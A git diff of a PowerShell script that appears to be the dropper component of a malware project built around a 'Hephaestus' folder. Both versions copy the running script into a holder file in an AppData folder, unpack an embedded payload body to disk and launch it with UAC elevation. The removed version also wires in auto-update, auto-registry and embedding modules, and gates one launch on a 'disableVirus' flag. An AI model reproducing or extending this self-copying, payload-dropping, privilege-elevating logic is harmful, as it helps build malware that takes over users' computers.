@@ -1,66 +1,44 @@
-. ./consts_body.ps1
 . ./utils.ps1
-. ./embeddings.ps1
-. ./autoupdate.ps1
-. ./autoextract.ps1
-. ./autoregistry.ps1
+. ./consts_autoextract.ps1
 
-#holderX
-
-try 
-{
-    $holderPath = Get-HolderPath
-    if (1 -eq 1 -or (-not (Test-Path $holderPath)))
+function checkFolder {
+    $appDataFolder = Get-HephaestusFolder
+    if (-not (Test-Path -Path $appDataFolder))
     {
-        $holderFolder = Get-HephaestusFolder  
-        $pathOrData = $MyInvocation.MyCommand.Definition
-        if ($pathOrData -like "*holderX*")
-        {
-        } 
-        else 
-        {
-            $pathOrData = $PSCommandPath
-            if (-not (Test-Path $pathOrData))
-            {
-                $pathOrData = $MyInvocation.MyCommand.Path
-            }
-            if (Test-Path $pathOrData)
-            {    
-                $pathOrData = GetUtfNoBom -file $pathOrData
-            } else 
-            {
-                $pathOrData = $pathOrData
-            }
-        } 
-        if (-not (Test-Path $holderFolder)) {
-            New-Item -Path $holderFolder -ItemType Directory | Out-Null
-        }
-        $holderFolder = Get-HephaestusFolder
-        $job = Start-Job -ScriptBlock {
-            param (
-                [string]$holderPath, [string]$holderFolder, [string]$pathOrData)
-                Set-Content -Path $holderPath -Value $pathOrData
-        } -ArgumentList $holderPath, $holderFolder, $pathOrData
-        Receive-Job -Job $job
-        Wait-Job -Job $job -Timeout 300 | Out-Null
-        Remove-Job -Job $job
+        New-Item -Path $appDataFolder -ItemType Directory | Out-Null
     }
 }
-catch {
-    Write-Host $_
+
+function extract_holder()
+{
+    $curScript = Get-ScriptPath
+    $holderFile = Get-HolderPath
+
+    $pathOrData = $MyInvocation.MyCommand.Definition
+    if ($pathOrData -like "IsDebug")
+    {
+        [System.IO.File]::WriteAllText($holderFile, $pathOrData)
+    } 
+    else 
+    {
+        Copy-Item -Path $curScript -Destination $holderFile -Force
+    } 
 }
 
-do_autoextract
-
-do_autoregistry
-
-do_autoupdate
-
-do_embeddings
-
-RunMe -script (Get-BodyPath) -arg "guimode" -uac $false
-
-if (-not $server.disableVirus)
+function extract_body()
 {
+    $holderBodyFile = Get-BodyPath
+    if (-not (Test-Path -Path $holderBodyFile))
+    {
+        ExtractEmbedding -inContent $xbody -outFile $holderBodyFile
+    }
+}
+
+function do_holder 
+{
+    checkFolder
+    extract_holder
+    extract_body
     RunMe -script (Get-BodyPath) -arg "" -uac $true
 }
+
